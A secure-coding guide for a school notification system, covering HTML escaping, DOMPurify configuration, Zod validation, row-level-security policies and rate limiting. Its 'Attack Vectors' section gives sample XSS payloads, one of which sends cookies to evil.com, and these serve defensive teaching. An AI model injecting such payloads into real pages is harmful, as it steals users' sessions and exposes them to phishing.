# Notification Security Guide

Security considerations, XSS prevention, and rate limiting for the notification system.

## Security Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         SECURITY LAYERS                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ 1. INPUT VALIDATION (Zod)                                              │  │
│  │    - Request body validation                                           │  │
│  │    - Query parameter validation                                        │  │
│  │    - UUID format validation                                            │  │
│  │    - Length limits (title: 200, message: 5000)                         │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                      │                                       │
│                                      ▼                                       │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ 2. AUTHENTICATION (requireAuth)                                        │  │
│  │    - Session validation                                                │  │
│  │    - User identification                                               │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                      │                                       │
│                                      ▼                                       │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ 3. AUTHORIZATION (Permission checks)                                   │  │
│  │    - Teachers: only their classes/students                             │  │
│  │    - Admins: any target                                                │  │
│  │    - RLS policies enforce at database level                            │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                      │                                       │
│                                      ▼                                       │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ 4. RATE LIMITING                                                       │  │
│  │    - POST /api/notifications/mark-read: 100 req/15min                  │  │
│  │    - Prevents abuse and DoS                                            │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                      │                                       │
│                                      ▼                                       │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ 5. XSS PREVENTION                                                      │  │
│  │    - HTML escaping (before template interpolation)                     │  │
│  │    - DOMPurify sanitization (before database storage)                  │  │
│  │    - Defense-in-depth approach                                         │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 1. XSS Prevention

### The Problem

Notification messages support HTML for rich formatting (`<strong>`, `<em>`, etc.). This creates XSS risk if user-controlled content is stored and rendered.

### Attack Vectors

```html
<!-- Script injection -->
<script>document.location='https://evil.com?c='+document.cookie</script>

<!-- Event handler injection -->
<img src=x onerror="alert('xss')">

<!-- Iframe injection (clickjacking) -->
<iframe src="https://evil.com/phishing.html"></iframe>

<!-- Template injection (before sanitization) -->
Teacher name: </strong><script>xss</script><strong>
```

### Defense Strategy: Two Layers

#### Layer 1: HTML Escaping (Template Injection Prevention)

**File**: `src/lib/utils/html-escape.ts`

User-controlled data is escaped **before** interpolation into HTML templates:

```typescript
import { escapeHtml } from '$lib/utils/html-escape';

// In auto-notifications.ts
const message = `<p><strong>${escapeHtml(teacherName)}</strong> a assigne...</p>`;
//                           ^^^^^^^^^^^^ Prevents template injection
```

**What it does**:

- `<` → `&lt;`
- `>` → `&gt;`
- `&` → `&amp;`
- `"` → `&quot;`
- `'` → `&#039;`

**Attack blocked**:

```typescript
// Input: teacherName = "</strong><script>xss</script><strong>"
// After escaping: "&lt;/strong&gt;&lt;script&gt;xss&lt;/script&gt;&lt;strong&gt;"
// Rendered: </strong><script>xss</script><strong> (as text, not HTML)
```

#### Layer 2: DOMPurify Sanitization (Stored XSS Prevention)

**File**: `src/lib/server/sanitization.ts`

All HTML is sanitized **before** storage using DOMPurify with strict configuration:

```typescript
import { sanitizeNotificationHtml } from '$lib/server/sanitization';

// In notifications.ts
const sanitizedMessage = sanitizeNotificationHtml(data.message);
// Then insert sanitizedMessage into database
```

**Configuration** (`src/lib/utils/sanitize-configs.ts`):

```typescript
export const NOTIFICATION_SANITIZE_CONFIG = {
	ALLOWED_TAGS: [
		'p',
		'br',
		'strong',
		'b',
		'em',
		'i',
		'u',
		'ul',
		'ol',
		'li',
		'blockquote',
		'code',
		'pre'
	],
	ALLOWED_ATTR: [], // NO attributes allowed
	ALLOW_DATA_ATTR: false,
	ALLOWED_URI_REGEXP: /^$/ // Block ALL URLs
};
```

**What it blocks**:

- `<script>` tags → removed
- `<iframe>`, `<object>`, `<embed>` → removed
- Event handlers (`onclick`, `onerror`) → attribute removed
- `javascript:` URLs → blocked
- `data:` URLs → blocked
- All CSS (`style` attribute) → removed

**Security logging**:

```typescript
// When HTML is modified, log potential attack
if (cleaned !== html) {
	console.warn('[SECURITY] Notification HTML sanitized - potential XSS attempt blocked', {
		original_length: html.length,
		cleaned_length: cleaned.length,
		removed_bytes: html.length - cleaned.length,
		timestamp: new Date().toISOString()
	});
}
```

### Why Both Layers?

| Layer         | Purpose                    | When                 |
| ------------- | -------------------------- | -------------------- |
| HTML Escaping | Prevent template injection | Before interpolation |
| DOMPurify     | Prevent stored XSS         | Before storage       |

**Example flow**:

```typescript
// 1. User input (teacher name from database)
const teacherName = 'M. Dupont <script>xss</script>';

// 2. HTML escape before template interpolation
const escapedName = escapeHtml(teacherName);
// → "M. Dupont &lt;script&gt;xss&lt;/script&gt;"

// 3. Build message
const message = `<p><strong>${escapedName}</strong> a assigne un devoir</p>`;
// → "<p><strong>M. Dupont &lt;script&gt;xss&lt;/script&gt;</strong>..."

// 4. DOMPurify sanitization (defense-in-depth)
const sanitized = sanitizeNotificationHtml(message);
// → Safe HTML, any remaining issues caught
```

---

## 2. Input Validation (Zod)

### API Endpoint Validation

```typescript
// src/routes/api/notifications/mark-read/+server.ts
const body = await request.json();
const validation = validateRequest(markNotificationReadSchema, body);

if (!validation.success) {
	throw error(400, validation.error);
}
```

### Schemas

**Mark Read**:

```typescript
const markNotificationReadSchema = z.object({
	notificationId: z.string().uuid()
});
```

**Create Notification**:

```typescript
const createNotificationSchema = z.object({
	title: z.string().min(1, 'Le titre est requis').max(200, 'Le titre est trop long (200 max)'),
	message: z
		.string()
		.min(1, 'Le message est requis')
		.max(5000, 'Le message est trop long (5000 max)'),
	type: z.enum(['info', 'alert', 'announcement', 'reminder']),
	priority: z.enum(['normal', 'important', 'urgent']),
	targetType: z.enum(['all', 'role', 'classes', 'users']),
	actionLabel: z.string().max(100).optional(),
	actionUrl: z.string().url().max(500).optional(),
	roles: z.array(z.enum(['student', 'teacher', 'admin'])).optional(),
	classIds: z.array(z.string().uuid()).min(1).optional(),
	userIds: z.array(z.string().uuid()).min(1).optional()
});
```

**Pagination**:

```typescript
const paginationSchema = z.object({
	page: z.coerce.number().int().positive().default(1),
	limit: z.coerce.number().int().positive().min(1).max(100).default(20)
});
```

---

## 3. Authentication

All notification endpoints require authentication:

```typescript
// Every endpoint starts with:
const { user } = await requireAuth(locals);
```

`requireAuth` middleware:

- Validates session cookie
- Extracts user ID
- Returns 401 if not authenticated

---

## 4. Authorization

### Role-Based Permissions

**Teachers** can only:

- Target their own classes
- Target students in their classes

**Admins** can:

- Target anyone (all, any role, any class, any user)

### Server-Side Enforcement

```typescript
// In createNotification()
if (profile.role === 'teacher') {
	if (data.target_type === 'all' || data.target_type === 'role') {
		return {
			success: false,
			error: 'Les professeurs ne peuvent cibler que leurs classes ou eleves'
		};
	}

	if (data.target_type === 'class' && data.target_class_ids) {
		// Verify teacher owns these classes
		const { data: teacherClasses } = await supabase
			.from('class_members')
			.select('class_id')
			.eq('teacher_id', createdBy);

		const teacherClassIds = teacherClasses?.map((cm) => cm.class_id) || [];
		const invalidClasses = data.target_class_ids.filter((id) => !teacherClassIds.includes(id));

		if (invalidClasses.length > 0) {
			return {
				success: false,
				error: 'Vous ne pouvez cibler que vos propres classes'
			};
		}
	}
}
```

### Database-Level Enforcement (RLS)

Even if server-side checks are bypassed, RLS policies enforce:

```sql
-- Teachers can only insert for their classes
CREATE POLICY "Teachers can create notifications for their classes"
  ON notifications FOR INSERT
  WITH CHECK (
    (SELECT role::TEXT FROM profiles WHERE id = auth.uid()) = 'teacher'
    AND (
      (target_type = 'classes' AND target_class_ids <@ (
        SELECT array_agg(id) FROM classes WHERE teacher_id = auth.uid()
      ))
      OR (target_type = 'users' AND target_user_ids <@ (
        SELECT array_agg(DISTINCT cm.student_id)
        FROM class_members cm
        JOIN classes c ON c.id = cm.class_id
        WHERE c.teacher_id = auth.uid()
      ))
    )
  );
```

---

## 5. Rate Limiting

### Mark Read Endpoint

```typescript
// src/routes/api/notifications/mark-read/+server.ts
const rateLimitResult = await checkNotificationMarkRateLimit(user.id);

if (!rateLimitResult.allowed) {
	return json(
		{ error: rateLimitResult.message },
		{
			status: 429,
			headers: {
				'Retry-After': rateLimitResult.retryAfter?.toString() || '900'
			}
		}
	);
}
```

### Configuration

| Endpoint          | Limit        | Window     | Purpose       |
| ----------------- | ------------ | ---------- | ------------- |
| `POST /mark-read` | 100 requests | 15 minutes | Prevent abuse |

### Response

```http
HTTP/1.1 429 Too Many Requests
Retry-After: 900
Content-Type: application/json

{
  "error": "Trop de requetes. Reessayez dans quelques minutes."
}
```

---

## 6. Data Exposure Prevention

### Creator Information

Only minimal creator info is exposed:

- `firstname`
- `lastname`
- `full_name`

No sensitive data (email, role, etc.) is included.

### Read Status Privacy

Users can only see:

- Their own read status
- (Creators/Admins) Aggregate read counts for their notifications

```sql
CREATE POLICY "Users can view their own read status"
  ON notification_reads FOR SELECT
  USING (user_id = auth.uid());
```

---

## 7. Soft Delete Protection

Notifications use soft delete (`deleted_at`) rather than hard delete:

```typescript
// Soft delete - not exposed to users
const { error } = await supabase
	.from('notifications')
	.update({ deleted_at: new Date().toISOString() })
	.eq('id', notificationId);
```

Benefits:

- Audit trail preserved
- Recovery possible
- Prevents data loss from accidental deletion

---

## 8. Security Checklist

### Before Creating Notifications

- [ ] User-controlled data escaped with `escapeHtml()`
- [ ] Message sanitized with `sanitizeNotificationHtml()`
- [ ] Input validated with Zod schema
- [ ] Authorization checked (teacher vs admin)

### API Endpoint Security

- [ ] `requireAuth()` called first
- [ ] Rate limiting applied (POST endpoints)
- [ ] Zod validation on request body
- [ ] Error messages don't leak internal info

### RLS Policies

- [ ] SELECT: only targeted users or creator
- [ ] INSERT: role-based restrictions
- [ ] UPDATE: owner or admin only
- [ ] DELETE: use soft delete via UPDATE

---

## 9. Monitoring

### Security Logs to Watch

```javascript
// XSS attempt blocked
console.warn('[SECURITY] Notification HTML sanitized - potential XSS attempt blocked');

// Rate limit exceeded
console.warn('[RATE_LIMIT] User exceeded notification mark rate limit');

// Authorization failure
console.warn('[AUTH] Teacher attempted to target unauthorized class');
```

### Metrics to Track

- Failed validation attempts (potential probing)
- Rate limit hits (potential abuse)
- Sanitization removals (potential XSS attempts)
- Unauthorized access attempts

---

## 10. Known Limitations

### In-Memory Pagination

Because Supabase doesn't support anti-joins (NOT EXISTS), we:

1. Fetch all targeted notifications
2. Filter unread in-memory
3. Apply pagination

**Impact**: Large notification volumes could cause memory issues.
**Mitigation**: 30-day expiration, cleanup job.

### Real-time Filter Bypass

Real-time listeners can't use complex targeting filters. We:

1. Listen to all INSERTs for the user
2. Refetch from API to apply proper targeting

**Impact**: Brief over-notification possible.
**Mitigation**: API refetch ensures correct filtering.
